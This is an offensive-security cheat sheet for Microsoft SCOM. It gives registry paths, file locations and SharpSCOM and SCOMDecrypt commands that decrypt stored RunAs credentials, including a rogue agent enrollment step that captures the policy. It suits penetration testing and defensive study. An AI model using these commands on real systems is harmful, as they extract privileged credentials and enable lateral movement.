# Deployment - SCOM

> Microsoft SCOM (System Center Operations Manager) is a monitoring tool used to oversee the health and performance of servers, applications, and infrastructure in IT environments. It collects data from systems, generates alerts for issues, and provides dashboards and reports for administrators.

## Tools

* [breakfix/SharpSCOM](https://github.com/breakfix/SharpSCOM) - A C# utility for interacting with SCOM.
* [nccgroup/SCOMDecrypt](https://github.com/nccgroup/SCOMDecrypt) - SCOMDecrypt is a tool to decrypt stored RunAs credentials from SCOM servers.

## SCOM “RunAs” credentials

### Recovery from SCOM database

The location of the SCOM database containing the RunAs credentials can be found by querying the following registry keys:

```ps1
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\System Center\2010\Common\Database\DatabaseServerName
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\System Center\2010\Common\Database\DatabaseName
```

Decrypt the stored credentials stored inside the SCOM management server database:

```ps1
.\SCOMDecrypt.exe
powershell-import C:\path\to\SCOMDecrypt.ps1
powershell Invoke-SCOMDecrypt
```

### Recovery via Registry

Stored at `HKLM\SYSTEM\CurrentControlSet\Services\HealthService\Parameters\Management Groups\$MANAGEMENT_GROUP$\SSDB\SSIDs\`.

```ps1
.\SharpSCOM.exe DecryptRunAs
```

### Recovery via Policy File

Use DPAPI to decrypt the RunAs credential from the policy.

```ps1
cat C:\Program Files\Microsoft Monitoring Agent\Agent\Health Service State\Connector Configuration Cache\$MANAGEMENT_GROUP_NAME$\OpsMgrConnector.Config
SharpSCOM DecryptPolicy /data:<base64-encrypted-data>
```

### Recovery after enrolling a new agent

**Requirements**:

* Management group name: `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\HealthService\Parameters\Management Groups\*`

```ps1
SharpSCOM.exe autoenroll /managementgroup:SCOM1 /server:scom.domain.lab /hostname:fake1.domain.lab /outfile:C:\Users\admin\desktop\policy_new.xml

# After enrolling a new agent, the attacker can decrypt the policy
SharpSCOM.exe decryptpolicy /data:"DAEAAA<REDACTED> /key:<RSAKeyValue><Modulus><REDACTED></D></RSAKeyValue>
```

## References

* [SCOMmand And Conquer – Attacking System Center Operations Manager (Part 2) - Matt Johnson - December 10, 2025](https://specterops.io/blog/2025/12/10/scommand-and-conquer-attacking-system-center-operations-manager-part-2/)
* [SCOMplicated? – Decrypting SCOM “RunAs” credentials - Rich Warren - February 23, 2017](https://www.nccgroup.com/research-blog/scomplicated-decrypting-scom-runas-credentials/)